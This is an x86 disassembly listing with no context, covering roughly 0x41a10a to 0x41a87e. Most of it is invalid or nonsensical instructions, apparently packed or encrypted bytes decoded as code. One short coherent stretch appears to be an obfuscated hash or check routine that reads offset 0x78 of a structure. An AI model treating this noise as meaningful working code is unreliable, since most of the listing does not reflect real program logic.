  41a10a:	jle    0x41a0d6
  41a10c:	pop    ebp
  41a10d:	das    
  41a10e:	xor    eax,0x1be4c616
  41a113:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a114:	test   al,0x9f
  41a116:	test   eax,0xd36534cf
  41a11b:	aaa    
  41a11c:	rcr    DWORD PTR [edx],cl
  41a11e:	push   0x4ca0350c
  41a123:	jl     0x41a11e
  41a125:	inc    esi
  41a126:	and    eax,0x8eb02881
  41a12b:	(bad)  
  41a12d:	mov    esp,0x8d4200cc
  41a132:	mov    dh,0x9a
  41a134:	idiv   BYTE PTR [ecx-0x2e]
  41a137:	outs   dx,DWORD PTR ds:[esi]
  41a138:	clc    
  41a139:	lea    edx,[esi+eax*1+0x458782e2]
  41a140:	sub    DWORD PTR ds:0x658791cc,esp
  41a146:	aad    0x23
  41a148:	adc    dh,bl
  41a14a:	push   edx
  41a14b:	push   ds
  41a14c:	sub    DWORD PTR [esi-0x1b],edx
  41a14f:	pop    ds
  41a150:	jle    0x41a1bf
  41a152:	and    al,0x4e
  41a154:	cmp    eax,0xa2313f7c
  41a159:	mov    WORD PTR [ebx-0x1f],?
  41a15c:	test   BYTE PTR [ebp+edi*8-0x5c0d41d7],bl
  41a163:	adc    esi,DWORD PTR [ebp+eax*2-0x6e5d02d4]
  41a16a:	sub    esi,ebx
  41a16c:	push   eax
  41a16d:	adc    edx,esp
  41a16f:	pushf  
  41a170:	or     BYTE PTR ds:0x9413a45b,dh
  41a176:	xor    DWORD PTR [ecx+0x327c054a],eax
  41a17c:	(bad)  [eax+0x56]
  41a17f:	into   
  41a180:	retf   
  41a181:	sub    DWORD PTR [ebx-0x347ec1f1],edx
  41a187:	mov    edi,0xec39765c
  41a18c:	push   0xa
  41a18e:	int3   
  41a18f:	dec    edi
  41a190:	call   DWORD PTR [ebp+0x61]
  41a193:	xchg   BYTE PTR [edi-0x7f148b99],bl
  41a199:	mov    eax,ds:0xe9317ba2
  41a19e:	cmp    BYTE PTR [edi+0x76],dl
  41a1a1:	aam    0xd0
  41a1a3:	jecxz  0x41a173
  41a1a5:	push   eax
  41a1a6:	repz mov dh,0x9e
  41a1a9:	nop
  41a1aa:	femms  
  41a1ac:	test   dl,dl
  41a1ae:	dec    ecx
  41a1af:	in     al,dx
  41a1b0:	cmp    al,0x65
  41a1b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1b3:	jo     0x41a169
  41a1b5:	jmp    0x50d0:0x24eb8edd
  41a1bc:	mov    bh,0xce
  41a1be:	push   ds
  41a1bf:	dec    ebp
  41a1c0:	jge    0x41a180
  41a1c2:	dec    ebp
  41a1c3:	dec    ebx
  41a1c4:	stos   BYTE PTR es:[edi],al
  41a1c5:	mov    BYTE PTR [esi+0x2312e930],ah
  41a1cb:	imul   ecx,esp,0xffffffcf
  41a1ce:	cs in  al,dx
  41a1d0:	inc    edx
  41a1d1:	jns    0x41a22a
  41a1d3:	test   BYTE PTR [ecx],0xc7
  41a1d6:	xchg   ebp,eax
  41a1d7:	ss push esp
  41a1d9:	xchg   esi,eax
  41a1da:	ds sbb cl,cl
  41a1dd:	out    0x31,eax
  41a1df:	je     0x41a245
  41a1e1:	mov    esp,0xfa71fdb
  41a1e6:	retf   0xce5
  41a1e9:	in     al,dx
  41a1ea:	cmp    al,0x15
  41a1ec:	dec    ecx
  41a1ed:	sbb    eax,0x627327be
  41a1f2:	popf   
  41a1f3:	jp     0x41a187
  41a1f5:	fld    TBYTE PTR [eax+0x5ef0f535]
  41a1fb:	add    edx,DWORD PTR [eax+esi*8+0x412f6cc5]
  41a202:	pushf  
  41a203:	jns    0x41a202
  41a205:	retf   0xd7a8
  41a208:	xchg   edx,eax
  41a209:	and    al,0x52
  41a20b:	and    ecx,ebp
  41a20d:	js     0x41a273
  41a20f:	inc    ecx
  41a210:	js     0x41a1b1
  41a212:	push   esp
  41a213:	dec    edi
  41a214:	inc    esp
  41a215:	add    bh,BYTE PTR [eax+eiz*8]
  41a218:	mov    ebx,0x4ddd3cd4
  41a21d:	xchg   ebp,eax
  41a21e:	fcom   DWORD PTR [ebx]
  41a220:	pop    edx
  41a221:	arpl   WORD PTR es:[edi-0x6f2c9ca1],bx
  41a228:	mul    DWORD PTR [ecx+ebp*4-0x2]
  41a22c:	retf   0x7032
  41a22f:	xchg   esi,edx
  41a231:	lea    edx,[edx-0x30f9563a]
  41a237:	fld    QWORD PTR [esi+ebp*4-0x49]
  41a23b:	mov    esp,0x261e086c
  41a240:	push   0x5e
  41a242:	jmp    0xfa28:0x8e71140
  41a249:	and    DWORD PTR [ebp-0x7ecc5998],ebx
  41a24f:	fistp  DWORD PTR [esi-0x43cc695a]
  41a255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a256:	and    DWORD PTR [ebx+0x79],eax
  41a259:	pop    ss
  41a25a:	fwait
  41a25b:	mov    esp,0xb4f6f30a
  41a260:	sub    eax,0xf9ce7a3f
  41a265:	or     ah,ah
  41a267:	les    ebp,FWORD PTR [ebx+esi*2]
  41a26a:	pop    ebp
  41a26b:	add    al,0x40
  41a26d:	xor    esp,esp
  41a26f:	sti    
  41a270:	sti    
  41a271:	(bad)  
  41a272:	neg    BYTE PTR [esi]
  41a274:	(bad)  
  41a275:	pop    eax
  41a276:	(bad)  
  41a277:	out    0x90,eax
  41a279:	add    BYTE PTR [bx+di-0x2d25],ah
  41a27e:	dec    ebx
  41a27f:	add    bh,dl
  41a281:	sub    DWORD PTR [edx],ebp
  41a283:	fiadd  WORD PTR [edi]
  41a285:	in     eax,0xf5
  41a287:	add    al,BYTE PTR [edi+0x1fa04a54]
  41a28d:	lahf   
  41a28e:	test   ecx,eax
  41a290:	and    eax,0xe82dbd21
  41a295:	repnz mov BYTE PTR [eax+0x76789ddb],bh
  41a29c:	cmc    
  41a29d:	mov    eax,0xf69f4716
  41a2a2:	jb     0x41a28e
  41a2a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2a5:	mov    esi,0xf54c614e
  41a2aa:	xor    esi,ecx
  41a2ac:	js     0x41a239
  41a2ae:	push   ebp
  41a2af:	xor    ecx,DWORD PTR [esi+eiz*4+0x79a3f245]
  41a2b6:	mov    dh,0xd7
  41a2b8:	push   ebp
  41a2b9:	mov    ah,ah
  41a2bb:	out    dx,al
  41a2bc:	cli    
  41a2bd:	cmp    esp,DWORD PTR [ebp-0xcd95b09]
  41a2c3:	inc    ecx
  41a2c4:	out    dx,eax
  41a2c5:	jmp    DWORD PTR [ecx-0x2b]
  41a2c8:	aad    0xac
  41a2ca:	les    esp,FWORD PTR [ecx]
  41a2cc:	xchg   ecx,eax
  41a2cd:	push   0x9b018283
  41a2d2:	test   BYTE PTR [esi],0x16
  41a2d5:	mov    esi,0x2b7c3f5d
  41a2da:	mov    ebp,0x34a66a30
  41a2df:	xor    al,BYTE PTR [ebx]
  41a2e1:	dec    ecx
  41a2e2:	fwait
  41a2e3:	shr    BYTE PTR [eax+ebx*2-0x49],0x26
  41a2e8:	and    eax,0x10033155
  41a2ed:	stc    
  41a2ee:	hlt    
  41a2ef:	mov    esi,0xbf33bb67
  41a2f4:	xchg   ebx,eax
  41a2f5:	jg     0x41a33a
  41a2f7:	aaa    
  41a2f8:	ins    BYTE PTR es:[edi],dx
  41a2f9:	add    esp,DWORD PTR [edi]
  41a2fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2fc:	pusha  
  41a2fd:	jmp    0x41a2fb
  41a2ff:	out    0x24,eax
  41a301:	stc    
  41a302:	jmp    0x3f9d61bc
  41a307:	gs cmp edx,DWORD PTR ss:0xb63eb06c
  41a30f:	test   al,0x5d
  41a311:	mov    bh,0xb8
  41a313:	adc    BYTE PTR [esp+ebp*2],bh
  41a316:	xchg   edx,eax
  41a317:	xchg   edx,eax
  41a318:	cwde   
  41a319:	xchg   esi,eax
  41a31a:	jle    0x41a2e3
  41a31c:	cmp    dl,BYTE PTR [ecx+0x79]
  41a31f:	jbe    0x41a306
  41a321:	mov    dh,0xc3
  41a323:	dec    edx
  41a324:	dec    esi
  41a325:	pop    edi
  41a326:	adc    edi,ebx
  41a328:	jecxz  0x41a2bd
  41a32a:	clc    
  41a32b:	stos   BYTE PTR es:[edi],al
  41a32c:	push   es
  41a32d:	(bad)  
  41a32e:	mov    eax,ebp
  41a330:	dec    ebx
  41a331:	xchg   edx,eax
  41a332:	in     al,dx
  41a333:	push   edi
  41a334:	ins    BYTE PTR es:[edi],dx
  41a335:	add    al,0x2a
  41a337:	jb     0x41a2e1
  41a339:	js     0x41a388
  41a33b:	push   esi
  41a33c:	lods   eax,DWORD PTR ds:[esi]
  41a33d:	push   eax
  41a33e:	jns    0x41a2f5
  41a340:	enter  0x9da,0xc8
  41a344:	sahf   
  41a345:	push   ecx
  41a346:	in     al,0xf5
  41a348:	push   eax
  41a349:	in     eax,dx
  41a34a:	add    eax,0xa9a8ad2a
  41a34f:	jbe    0x41a384
  41a351:	mov    bh,0x9f
  41a353:	stc    
  41a354:	and    eax,0x188b3df
  41a359:	pushf  
  41a35a:	jp     0x41a31a
  41a35c:	push   esi
  41a35d:	sbb    al,0x9f
  41a35f:	inc    eax
  41a360:	jle    0x41a37f
  41a362:	add    eax,0x193411f7
  41a367:	shrd   ebx,ebp,cl
  41a36a:	cli    
  41a36b:	aas    
  41a36c:	lods   al,BYTE PTR ds:[esi]
  41a36d:	dec    esp
  41a36e:	pusha  
  41a36f:	jecxz  0x41a313
  41a371:	call   0xace6bc3
  41a376:	dec    ecx
  41a377:	imul   ebx,DWORD PTR [esi-0x1bd45533],0x5c
  41a37e:	lock pop ecx
  41a380:	jne    0x41a3a2
  41a382:	or     al,0xa3
  41a384:	cmp    edi,DWORD PTR [eax]
  41a386:	shl    BYTE PTR [ebx],0x72
  41a389:	sub    DWORD PTR [esp+edi*4-0x63],eax
  41a38d:	push   eax
  41a38e:	adc    DWORD PTR [esi+0xe],0xc885d9e1
  41a395:	in     al,dx
  41a396:	or     edx,DWORD PTR [edi]
  41a398:	ret    
  41a399:	shl    DWORD PTR [edx+edi*2],0x2d
  41a39d:	jae    0x41a357
  41a39f:	mov    al,0xc
  41a3a1:	sbb    BYTE PTR [esi+ebp*8+0x6158f99e],ah
  41a3a8:	popa   
  41a3a9:	rcl    dh,cl
  41a3ab:	or     DWORD PTR [eax-0x2af6e8da],eax
  41a3b1:	xchg   ebp,eax
  41a3b2:	loopne 0x41a415
  41a3b4:	hlt    
  41a3b5:	call   0x3c7e:0x45b339fb
  41a3bc:	and    al,0x35
  41a3be:	adc    al,0xbe
  41a3c0:	mov    al,0xab
  41a3c2:	mov    ebp,0x5fcaae84
  41a3c7:	mov    ebp,0x8c6e89d5
  41a3cc:	sbb    ah,BYTE PTR [edx]
  41a3ce:	or     DWORD PTR [eax+esi*8-0x31],ecx
  41a3d2:	adc    eax,0x309a900b
  41a3d7:	fcmovnu st,st(0)
  41a3d9:	push   ebp
  41a3da:	in     al,dx
  41a3db:	pop    edx
  41a3dc:	push   esp
  41a3dd:	xor    dl,bl
  41a3df:	ja     0x41a381
  41a3e1:	sub    edi,edi
  41a3e3:	dec    ecx
  41a3e4:	pusha  
  41a3e5:	scas   al,BYTE PTR es:[edi]
  41a3e6:	dec    ebx
  41a3e7:	adc    eax,0xe5f11106
  41a3ec:	repnz mov ebx,0xd0e79b14
  41a3f2:	jns    0x41a438
  41a3f4:	mov    WORD PTR [ebx-0x96d6ad5],?
  41a3fa:	jle    0x41a402
  41a3fc:	cdq    
  41a3fd:	les    eax,FWORD PTR [edi]
  41a3ff:	inc    esp
  41a400:	jmp    0x7db0:0xd99777d
  41a407:	outs   dx,BYTE PTR ds:[esi]
  41a408:	daa    
  41a409:	or     eax,0x65238f87
  41a40e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a40f:	add    BYTE PTR [edi],dh
  41a411:	test   al,0x35
  41a413:	cmp    al,ah
  41a415:	aaa    
  41a416:	test   al,0x88
  41a418:	fild   WORD PTR [ecx]
  41a41a:	jmp    0x41a3ac
  41a41c:	push   es
  41a41d:	ficomp DWORD PTR [esi+edi*2-0x29a26a5c]
  41a424:	iret   
  41a425:	test   al,cl
  41a427:	cwde   
  41a428:	pop    esi
  41a429:	jo     0x41a44a
  41a42b:	dec    esi
  41a42c:	xor    ecx,ecx
  41a42e:	sub    al,0xa6
  41a430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a431:	(bad)  
  41a432:	addr16 xchg edi,eax
  41a434:	sbb    al,0x5
  41a436:	mov    bl,cl
  41a438:	sub    BYTE PTR [edx],cl
  41a43a:	push   ebp
  41a43b:	cld    
  41a43c:	loop   0x41a3f5
  41a43e:	mov    ds:0x3f911389,al
  41a443:	shr    BYTE PTR [ebp-0x31],cl
  41a446:	mov    ds:0x36c117d3,eax
  41a44b:	push   0x90a1f0b
  41a450:	or     eax,0x1a0bc79e
  41a455:	xchg   DWORD PTR [ebp+edx*4+0x302187e7],edx
  41a45c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a45d:	pusha  
  41a45e:	aaa    
  41a45f:	js     0x41a4aa
  41a461:	mov    ah,0xaf
  41a463:	jge    0x41a3ef
  41a465:	arpl   WORD PTR [edx+0x60a171bb],cx
  41a46b:	cld    
  41a46c:	jmp    0x41a4a5
  41a46e:	dec    ebx
  41a46f:	xor    eax,0x2ea002eb
  41a474:	sbb    al,0x4e
  41a476:	adc    BYTE PTR [esi-0x131ab49a],al
  41a47c:	mov    eax,0x561e6bd
  41a481:	das    
  41a482:	cdq    
  41a483:	jmp    0x41a48e
  41a485:	lock aas 
  41a487:	mov    dl,0x9e
  41a489:	ins    DWORD PTR es:[edi],dx
  41a48a:	out    dx,eax
  41a48b:	sub    al,0xb0
  41a48d:	lock sbb ah,BYTE PTR [ebp+esi*1+0x6b]
  41a492:	sti    
  41a493:	cmp    bl,BYTE PTR [ecx+eax*1-0x5ea19962]
  41a49a:	ins    BYTE PTR es:[edi],dx
  41a49b:	xor    ecx,ebx
  41a49d:	arpl   WORD PTR [edi],bp
  41a49f:	push   ds
  41a4a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4a1:	icebp  
  41a4a2:	inc    edx
  41a4a3:	sub    edi,esp
  41a4a5:	jae    0x41a507
  41a4a7:	inc    eax
  41a4a8:	jno    0x41a4c9
  41a4aa:	mov    ds:0x77f2898a,al
  41a4af:	ins    DWORD PTR es:[edi],dx
  41a4b0:	xlat   BYTE PTR ds:[ebx]
  41a4b1:	xlat   BYTE PTR ds:[ebx]
  41a4b2:	push   ss
  41a4b3:	push   eax
  41a4b4:	xor    esi,edx
  41a4b6:	add    eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8+0x41abb5ab]
  41a500:	dec    ebp
  41a501:	dec    eax
  41a502:	add    BYTE PTR [ecx+0x62],ah
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx-0x55]
  41a50a:	push   0x52
  41a50c:	push   esi
  41a50d:	test   eax,0x6e589dbf
  41a512:	add    al,0x16
  41a514:	scas   eax,DWORD PTR es:[edi]
  41a515:	sar    DWORD PTR [esi+0x596d6d1],0x36
  41a51c:	jecxz  0x41a508
  41a51e:	rcr    BYTE PTR [ebx-0x2d9b959f],0x3f
  41a525:	or     ebp,DWORD PTR ds:0x4e8ad2f0
  41a52b:	jecxz  0x41a566
  41a52d:	cmp    DWORD PTR [ebx],0xe6e7d80a
  41a533:	aad    0xab
  41a535:	cmp    eax,0x3fade1f5
  41a53a:	sbb    al,0x6c
  41a53c:	aas    
  41a53d:	push   es
  41a53e:	shr    BYTE PTR [esi],cl
  41a540:	xchg   ecx,eax
  41a541:	cmc    
  41a542:	xor    DWORD PTR [ecx+0x44fc7b5d],0xf8911413
  41a54c:	iret   
  41a54d:	js     0x41a4fc
  41a54f:	mov    DWORD PTR [ecx+0x53],ebp
  41a552:	pop    edx
  41a553:	cmp    eax,ecx
  41a555:	out    0x9e,eax
  41a557:	int3   
  41a558:	xor    BYTE PTR [esi+0x1],bl
  41a55b:	and    eax,0x9ae27c11
  41a560:	fisttp WORD PTR [eax-0x7]
  41a563:	out    0xaf,eax
  41a565:	js     0x41a581
  41a567:	dec    ebx
  41a568:	popf   
  41a569:	fpatan 
  41a56b:	(bad)  
  41a56c:	jg     0x41a56a
  41a56e:	push   es
  41a56f:	mov    ds,WORD PTR [ebx]
  41a571:	(bad)  
  41a573:	aaa    
  41a574:	fsubr  QWORD PTR [esi]
  41a576:	int    0xac
  41a578:	sahf   
  41a579:	inc    ebx
  41a57a:	pop    eax
  41a57b:	jle    0x41a596
  41a57d:	call   0xfb6ccf78
  41a582:	mov    BYTE PTR [ecx+0x14e5f869],dh
  41a588:	(bad)  
  41a589:	aaa    
  41a58a:	lods   eax,DWORD PTR ds:[esi]
  41a58b:	push   cs
  41a58c:	sar    esp,1
  41a58e:	or     DWORD PTR [ecx],esp
  41a590:	test   dl,ah
  41a592:	push   esi
  41a593:	dec    edx
  41a594:	add    BYTE PTR [eax-0x61ff0158],bh
  41a59a:	mov    bl,BYTE PTR [eax+ebx*2]
  41a59d:	outs   dx,BYTE PTR ds:[esi]
  41a59e:	mov    al,ds:0x72cde270
  41a5a3:	stc    
  41a5a4:	bound  ebp,QWORD PTR [edx+0x7e]
  41a5a7:	out    dx,eax
  41a5a8:	ret    0x6a2
  41a5ab:	jge    0x41a5f4
  41a5ad:	mov    BYTE PTR [edx+0xaaaad2b],0x6d
  41a5b4:	pop    ss
  41a5b5:	mov    ?,WORD PTR [esi-0x71fcd8d0]
  41a5bb:	cmp    esi,0xffffffc2
  41a5be:	pushf  
  41a5bf:	stos   DWORD PTR es:[edi],eax
  41a5c0:	adc    al,0xda
  41a5c2:	ins    DWORD PTR es:[edi],dx
  41a5c3:	xchg   esi,eax
  41a5c4:	(bad)  
  41a5c5:	jp     0x41a56e
  41a5c7:	cmp    ecx,DWORD PTR [ecx-0x7b9f4142]
  41a5cd:	adc    al,0xda
  41a5cf:	ds clc 
  41a5d1:	adc    al,ah
  41a5d3:	fld    QWORD PTR [edx-0x5b]
  41a5d6:	test   ch,ah
  41a5d8:	mov    ah,0xbc
  41a5da:	and    eax,0x7a681800
  41a5df:	pop    edx
  41a5e0:	mov    esp,0x1477cb6c
  41a5e5:	mov    edx,0x6fe3bb1b
  41a5ea:	out    0xed,al
  41a5ec:	js     0x41a615
  41a5ee:	jmp    0x41a645
  41a5f0:	push   ebp
  41a5f1:	inc    edx
  41a5f2:	inc    esp
  41a5f3:	dec    esp
  41a5f4:	ret    
  41a5f5:	xor    dh,BYTE PTR [esi]
  41a5f7:	scas   al,BYTE PTR es:[edi]
  41a5f8:	idiv   esp
  41a5fa:	popa   
  41a5fb:	mov    ecx,0xe569e5b5
  41a600:	mov    cs,eax
  41a602:	mov    al,0x57
  41a604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a605:	mov    ds,WORD PTR [ecx+ebp*2]
  41a608:	call   0x4c98:0x287dfb01
  41a60f:	fimul  DWORD PTR [ebp-0x33a8755]
  41a615:	hlt    
  41a616:	pusha  
  41a617:	lods   al,BYTE PTR ds:[esi]
  41a618:	mov    esp,0xae86742d
  41a61d:	fistp  DWORD PTR ds:0x94072786
  41a623:	popa   
  41a624:	sbb    BYTE PTR [edi+edi*2+0x5f30598b],ah
  41a62b:	mov    ebx,0x585baa37
  41a630:	and    DWORD PTR [edx],0x9b5ae302
  41a636:	mov    edx,0x8afd0b99
  41a63b:	push   esi
  41a63c:	pop    ebx
  41a63d:	push   0xffffffc4
  41a63f:	and    al,ch
  41a641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a642:	adc    edx,ecx
  41a644:	adc    cl,BYTE PTR [ebx+0x64c9b5ef]
  41a64a:	mov    edx,0x41bea42b
  41a64f:	pop    ebp
  41a650:	add    bh,ah
  41a652:	pop    eax
  41a653:	(bad)  
  41a654:	call   0x486ba41d
  41a659:	push   0x14b9b69a
  41a65e:	mov    bh,0x6c
  41a660:	adc    bl,BYTE PTR [eax]
  41a662:	pop    esi
  41a663:	push   0xffffffda
  41a665:	push   ebx
  41a666:	dec    ebx
  41a667:	ins    DWORD PTR es:[edi],dx
  41a668:	cmp    al,0xe4
  41a66a:	pop    edx
  41a66b:	dec    ebp
  41a66c:	xchg   ebx,eax
  41a66d:	fs lds ebx,FWORD PTR fs:[edi+0x36734922]
  41a675:	jmp    0x8342cd64
  41a67a:	jbe    0x41a6e2
  41a67c:	mov    al,dl
  41a67e:	xor    eax,0xc2c6b14a
  41a683:	pop    ds
  41a684:	popf   
  41a685:	test   BYTE PTR [ebx-0x25],bl
  41a688:	sbb    BYTE PTR [edi],cl
  41a68a:	aas    
  41a68b:	aas    
  41a68c:	popf   
  41a68d:	imul   esi,DWORD PTR [ebx-0x41],0x93dde95
  41a694:	mov    ah,0xb7
  41a696:	mov    ebx,0x8d320122
  41a69b:	push   edx
  41a69c:	(bad)  
  41a69e:	push   eax
  41a69f:	jge    0x41a6a4
  41a6a1:	enter  0x91fd,0xdc
  41a6a5:	test   al,0xc1
  41a6a7:	xor    al,bl
  41a6a9:	jae    0x41a66f
  41a6ab:	xchg   edi,eax
  41a6ac:	in     al,0x91
  41a6ae:	adc    BYTE PTR [ecx-0x75],dh
  41a6b1:	lods   eax,DWORD PTR ds:[esi]
  41a6b2:	jno    0x41a68a
  41a6b4:	pop    eax
  41a6b5:	pop    ebx
  41a6b6:	aam    0x57
  41a6b8:	xor    eax,DWORD PTR [eax-0x3fb81c0d]
  41a6be:	push   eax
  41a6bf:	push   ebx
  41a6c0:	push   esp
  41a6c1:	int    0xfe
  41a6c3:	sub    al,0xf0
  41a6c5:	push   ecx
  41a6c6:	cdq    
  41a6c7:	addr16 aas 
  41a6c9:	mov    bh,0x2b
  41a6cb:	fdivr  st,st(5)
  41a6cd:	mov    al,ds:0xf150a13f
  41a6d2:	pop    ebp
  41a6d3:	push   eax
  41a6d4:	pop    ebx
  41a6d5:	sbb    eax,0x89809ed2
  41a6da:	pop    ebp
  41a6db:	and    eax,0xd0c6edf9
  41a6e0:	(bad)  
  41a6e1:	ret    0x95c6
  41a6e4:	xor    BYTE PTR [ebx+0x6f],0xec
  41a6e8:	jmp    0xbf4afb1f
  41a6ed:	out    dx,eax
  41a6ee:	adc    ch,BYTE PTR es:[ebx+ebx*2-0x1f44fc26]
  41a6f6:	pop    ss
  41a6f7:	cli    
  41a6f8:	mov    ecx,0xf8fe3c2e
  41a6fd:	cmp    esi,DWORD PTR [ebx+0x3]
  41a700:	push   ebx
  41a701:	sti    
  41a702:	or     DWORD PTR [ebp+0x820aca6],ebp
  41a708:	pop    ds
  41a709:	fsub   st(0),st
  41a70b:	loopne 0x41a6cf
  41a70d:	cmp    al,0x9e
  41a70f:	push   ecx
  41a710:	mov    ds:0x5a6c5c21,eax
  41a715:	in     eax,dx
  41a716:	ret    0xcfb1
  41a719:	and    esi,ebx
  41a71b:	repz jne 0x41a736
  41a71e:	push   edi
  41a71f:	retf   0x52d9
  41a722:	add    BYTE PTR ds:0x9e6e81b9,0x7d
  41a729:	push   eax
  41a72a:	push   ss
  41a72b:	xor    ch,BYTE PTR [edx-0x545f9a44]
  41a731:	pop    ecx
  41a732:	sti    
  41a733:	outs   dx,BYTE PTR ds:[esi]
  41a734:	lods   eax,DWORD PTR ds:[esi]
  41a735:	inc    edx
  41a736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a737:	out    dx,al
  41a738:	out    dx,al
  41a739:	xchg   edi,eax
  41a73a:	int3   
  41a73b:	ret    
  41a73c:	cmc    
  41a73d:	in     al,dx
  41a73e:	and    dh,bh
  41a740:	dec    esp
  41a741:	dec    esi
  41a742:	stc    
  41a743:	(bad)  
  41a744:	sbb    DWORD PTR [eax+0x3f],0x5f
  41a748:	pop    ss
  41a749:	imul   ebp,DWORD PTR [ebp+0x3e9d0ee6],0xffffffa9
  41a750:	add    eax,0x53cdfffe
  41a755:	pop    edx
  41a756:	cli    
  41a757:	add    eax,DWORD PTR [edx+0x71]
  41a75a:	jmp    FWORD PTR [esi+0x61]
  41a75d:	push   ebx
  41a75e:	sar    DWORD PTR ds:0x27aa7a30,cl
  41a764:	or     bh,dh
  41a766:	jle    0x41a6f1
  41a768:	clc    
  41a769:	cmp    eax,0x92a3e73f
  41a76e:	mov    BYTE PTR [eax+0x45],dh
  41a771:	cs add al,bh
  41a774:	outs   dx,DWORD PTR ds:[esi]
  41a775:	sbb    eax,0x5d6c3101
  41a77a:	sub    al,0x35
  41a77c:	mov    eax,0x908b63e0
  41a781:	mov    esp,ecx
  41a783:	fsub   DWORD PTR [ecx+eiz*1+0x5d]
  41a787:	xchg   esp,eax
  41a788:	shl    BYTE PTR [ebp+0x313c33ec],cl
  41a78e:	dec    ebx
  41a78f:	sbb    ah,dh
  41a791:	fist   WORD PTR [edi+0x46b830c1]
  41a797:	aam    0xdc
  41a799:	add    BYTE PTR [ebx],cl
  41a79b:	sub    DWORD PTR [edi+0x778ed6c6],0xd6b9105d
  41a7a5:	mov    bl,BYTE PTR [ecx-0x7a]
  41a7a8:	mov    cl,0xd5
  41a7aa:	jno    0x41a7b1
  41a7ac:	leave  
  41a7ad:	sahf   
  41a7ae:	shl    BYTE PTR [ebx+ebp*8+0x72be5f58],cl
  41a7b5:	stos   BYTE PTR es:[edi],al
  41a7b6:	mov    edi,0xb93e295a
  41a7bb:	das    
  41a7bc:	fisub  WORD PTR [eax+0x7ce017b7]
  41a7c2:	fild   QWORD PTR [eax]
  41a7c4:	fcomp  st(3)
  41a7c6:	sbb    cl,BYTE PTR [ebp-0x6af07ffc]
  41a7cc:	lods   eax,DWORD PTR ds:[esi]
  41a7cd:	adc    edi,DWORD PTR [ebx+0x5d2fa352]
  41a7d3:	test   al,0xc0
  41a7d5:	repz push edx
  41a7d7:	jae    0x41a836
  41a7d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7da:	out    0xbc,al
  41a7dc:	je     0x41a816
  41a7de:	mov    bh,0x7e
  41a7e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7e1:	in     al,dx
  41a7e2:	aaa    
  41a7e3:	xchg   esi,eax
  41a7e4:	fadd   QWORD PTR [ecx+0x64c2ce4a]
  41a7ea:	ins    BYTE PTR es:[edi],dx
  41a7eb:	(bad)  
  41a7ed:	(bad)  
  41a7ee:	repz fcomp QWORD PTR [esp+esi*4+0x71]
  41a7f3:	popf   
  41a7f4:	ss xor eax,0x41577483
  41a7fa:	pop    ebp
  41a7fb:	xor    eax,0x4d629e3d
  41a800:	lock fisub WORD PTR [eax]
  41a803:	mov    ebx,DWORD PTR [ecx+0x4b]
  41a806:	adc    DWORD PTR [ebx+0x17],edi
  41a809:	(bad)  
  41a80a:	(bad)  
  41a80b:	adc    al,0xdd
  41a80d:	sbb    bh,ch
  41a80f:	jmp    0x41a885
  41a811:	pop    ds
  41a812:	mov    eax,ds:0xbcec2211
  41a817:	aam    0x2
  41a819:	inc    edi
  41a81a:	and    ch,dh
  41a81c:	sub    BYTE PTR [ecx+edx*8-0x3ffdc9dd],0xb4
  41a824:	adc    eax,0x5c89c197
  41a829:	and    bh,BYTE PTR [eax-0x6f]
  41a82c:	adc    ecx,ecx
  41a82e:	imul   eax,DWORD PTR [edi],0x2a
  41a831:	push   esi
  41a832:	loope  0x41a880
  41a834:	jne    0x41a886
  41a836:	test   BYTE PTR [esi-0x66],0xb2
  41a83a:	pop    ebp
  41a83b:	aad    0xdf
  41a83d:	fwait
  41a83e:	mov    ch,0x56
  41a840:	push   0xfffffff0
  41a842:	(bad)  
  41a843:	arpl   di,bx
  41a845:	inc    ebp
  41a846:	inc    edx
  41a847:	cmp    eax,0x7e4a64f3
  41a84c:	jnp    0x41a7ef
  41a84e:	adc    al,0x51
  41a850:	adc    DWORD PTR [esi+0x6329d7e5],esp
  41a856:	les    esi,FWORD PTR [esi-0x30ecc425]
  41a85c:	test   eax,0x7e5fee78
  41a861:	dec    eax
  41a862:	cmp    edx,DWORD PTR [edx]
  41a864:	adc    esp,DWORD PTR [esi-0x45998d94]
  41a86a:	call   0x512c6b61
  41a86f:	adc    dh,BYTE PTR [esi-0x7e]
  41a872:	jecxz  0x41a890
  41a874:	mov    dh,0xae
  41a876:	sti    
  41a877:	aam    0xe8
  41a879:	jae    0x41a8aa
  41a87b:	leave  
  41a87c:	pop    ds
  41a87d:	inc    edx
  41a87e:	mov    bl,0x89
